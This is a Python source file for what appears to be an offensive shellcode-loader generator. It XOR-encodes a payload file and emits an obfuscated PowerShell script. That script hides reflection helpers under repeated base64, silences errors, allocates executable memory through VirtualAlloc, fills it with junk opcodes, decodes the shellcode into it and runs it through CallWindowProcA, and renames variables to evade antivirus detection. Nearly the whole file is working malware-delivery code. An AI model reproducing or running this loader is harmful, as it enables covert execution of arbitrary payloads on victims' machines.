import random

from base64 import b64encode

from obfuscator import Obfuscator
from utils import randomStr

REFLECTION_TEMPLATE = r"""
function LookupFunc {
        param(
            $ModuleName,
            $FunctionName
        )

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
                Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $tmp=@()
        $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
function GetDelegateType {
        param(
            [Type[]]$Func,
            [Type]$DelType
        )

        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass'
, [System.MulticastDelegate])
        $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

        return $type.CreateType()
}
"""

BASE64_TEMPLATE = r"""
(function b64decode {
    param (
        [string]$b64,
        [int]$times
    )
    $decoded = $b64
    for ($a = 0; $a -lt $times; $a++) {
        $bytes = [Convert]::FromBase64String($decoded)
        $decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
    }
    return $decoded
})>$null
"""

DEC_STR_TEMPLATE = r"""
(function decStr {
    param(
        $enc
    )

    for ($index=%first%-1; $index -lt $enc.Length; $index+=%step%){
        $dec += $enc.substring.invoke($index, 1)
    }

    $dec
})>$null
"""


"""
Function taabelighedernes($Coelanaglyphic){
    $Fremtidsforskeren=$Coelanaglyphic.Length-$Jeeing;
    
    For( $Chiantier=4; $Chiantier -lt $Fremtidsforskeren; $Chiantier+=5){
        $Corpusculated+=$Coelanaglyphic.$sidsen.'Invoke'(     $Chiantier, $Jeeing);
    }
    
    echo $Corpusculated;
}
"""

class Builder():
    def __init__(self, filename, output):
        self.filename = filename
        self.output = output
        self.obfuscator = Obfuscator()
        self.file = bytes()
        self.str_file = ""
        self.b64_times = 0

    def build(self):
            pass

    def fromFile(self):
        with open(self.filename, "rb") as f:
            self.file = f.read()
            #self.file = self.selected_encoder.encode(self.file)
            self.file = self.obfuscator.encodeXOR(self.file)
            
    def bytesToStr(self, _bytes):
        b = bytes([x for x in _bytes])
        return ",".join(["0x{:02x}".format(x) for x in b])
    
    def tob64(self, string):
        if not self.b64_times:
            self.b64_times = random.randint(3, 13)
        
        b64 = string.encode()
        for _ in range(self.b64_times):
            b64 = b64encode(b64)
    
        return b64.decode()             # TODO: split into chunks?

class ShellcodeBuilder(Builder):
    def build(self):
        self.fromFile()
        self.str_file = self.bytesToStr(self.file)
        
        junk_op_codes = f"@({','.join(self.obfuscator.junkOPCodes())})"
        size_mem_per_region = random.randint(10000, 20000) * 4
        
        #reflection = self.obfuscator.replaceVars(REFLECTION_TEMPLATE)
        #reflection = self.obfuscator.replaceFunctions(reflection)
        #reflection = self.tob64(reflection)
        reflection = self.tob64(REFLECTION_TEMPLATE)

        dec_str = DEC_STR_TEMPLATE.replace(r"%first%", str(self.obfuscator.first_char_idx))
        dec_str = dec_str.replace(r"%step%", str(self.obfuscator.step))

        ps1 = []
        ps1.append(BASE64_TEMPLATE)
        ps1.append(dec_str)
        ps1.append(f"iex(b64decode {reflection} {self.b64_times})")
        ps1.append(f'$ErrorActionPreference = (decStr {self.obfuscator.stringsEncoder("SilentlyContinue")})')
        ps1.append(f"$name_op_codes = {junk_op_codes}")
        ps1.append(f"$shellcode = [byte[]]@({self.str_file})")
        ps1.append(f"$shellcode_len = $shellcode.Length")
        ps1.append(f"$total_sc_len = {size_mem_per_region} + $shellcode_len")
        ps1.append(f'$func_ptr = LookupFunc (decStr {self.obfuscator.stringsEncoder("kernel32")}) (decStr {self.obfuscator.stringsEncoder("VirtualAlloc")})')
        ps1.append(f"$delegate_type = GetDelegateType @([IntPtr], [uint32], [uint32], [uint32]) ([IntPtr])")
        ps1.append(f"$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($func_ptr, $delegate_type)")
        ps1.append(f"$shellcode_addr = $func.invoke([IntPtr]::Zero, $total_sc_len, 0x3000, 0x40)")       # TODO: change RWX to RW -> RX
        
        ps1.append(f"""
$mem_possition = 0
$func_ptr = LookupFunc (decStr {self.obfuscator.stringsEncoder("msvcrt")}) (decStr {self.obfuscator.stringsEncoder("memset")})
$delegate_type = GetDelegateType $([IntPtr], [uint32], [uint32])
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($func_ptr, $delegate_type)
while($mem_possition -le {size_mem_per_region}/4){{
    $idx = (New-Object System.Random).Next(0, $name_op_codes.Length-1)
    $func.invoke($shellcode_addr.ToInt64()+$mem_possition, $name_op_codes[$idx][0], 1)
    $mem_possition+=1
    $func.invoke($shellcode_addr.ToInt64()+$mem_possition, $name_op_codes[$idx][1], 1)
    $mem_possition+=1
    $func.invoke($shellcode_addr.ToInt64()+$mem_possition, $name_op_codes[$idx][2], 1)
    $mem_possition+=1
    $func.invoke($shellcode_addr.ToInt64()+$mem_possition, $name_op_codes[$idx][3], 1)
    $mem_possition+=1
}}
""")

        ps1.append(f"""
$key = {f'@({','.join([f'0x{x:02x}' for x in self.obfuscator.key])})'}
for ($i = 0; $i -le $shellcode_len;$i++){{
    $func.invoke($mem_possition+$i+$shellcode_addr.ToInt64(), $shellcode[$i] -bxor $key[$i % $key.Length],1)
}}
""")
        
        ps1.append(f'$func_ptr = LookupFunc (decStr {self.obfuscator.stringsEncoder("user32")}) (decStr {self.obfuscator.stringsEncoder("CallWindowProcA")})')
        ps1.append(f"$delegate_type = GetDelegateType @([intPtr], [intPtr], [IntPtr], [intPtr], [intPtr]) ([IntPtr])")
        ps1.append(f"$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($func_ptr, $delegate_type)")
        ps1.append(f"$func.invoke($shellcode_addr, 0, 0, 0, 0)")


        ps1.append(self.obfuscator.getJunkCode())

        # [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
        # $CallWindowProcA.Invoke($__Alloc_Addr,$__Alloc_Addr2,$__ntdll_NtProtectVirtualMemory_addr,0,0)
        # $__Alloc_Addr2 = LRESULT CALLBACK MyNewWindowProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)


        code = "\n".join(ps1)
        code = self.obfuscator.replaceVars(code)
        code = self.obfuscator.replaceFunctions(code)
        print(code)

        with open(self.output, "w") as f:
            f.write(code)